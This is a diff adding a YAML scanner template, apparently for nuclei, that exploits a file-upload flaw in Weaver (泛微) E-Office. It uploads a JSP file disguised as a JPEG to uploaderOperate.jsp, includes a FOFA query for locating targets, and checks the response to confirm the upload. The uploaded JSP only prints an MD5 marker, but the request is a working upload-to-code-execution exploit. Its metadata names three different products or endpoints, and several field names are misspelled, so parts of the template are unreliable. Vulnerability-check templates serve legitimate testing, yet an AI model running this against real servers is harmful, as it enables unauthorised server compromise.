@@ -1,0 +1,59 @@
+id: 泛微E-Office uploaderOperate文件上传漏洞
+
+
+info:
+  name: 泛微KtreeUploadAction
+  severity: high
+  description: e-cology存在文件上传漏洞，攻击者利用该漏洞可以获取服务器权限
+  reference: 暂无
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="泛微-EOffice"
+  
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/workrelate/plan/util/uploaderOperate.jsp"
+
+    Rheader:
+      - Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt & Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 & Accept-Encoding:gzip, deflate
+        
+    body: 
+      - |
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+        Content-Disposition:form-data; name="Fdiledata"; filename="test123.jsp"
+        Content-Type:image/jpeg
+        
+        <%@ page textType="text/html; charset=GBK"%>
+        <%@page import="java.math.BigInteger"%>
+        <%@page import="java.security.MessageDigest"%>
+        <%
+
+        MessageDigest md5 = null;
+        md5 = MessageDigest.getInstance("MD5");
+        String s = "123";
+        String miyao = "abc";
+        String jiamichuan = s + miyao;
+        md5.update(jiamichuan.getBytes());
+        String md5String = new BigInteger(1, md5.digest()).toString(16);
+        out.println(md5String);
+
+        %>
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "test123.jsp"
+          - "btn_wh"
+
+      - type: status
+        status:
+          - 200
+    
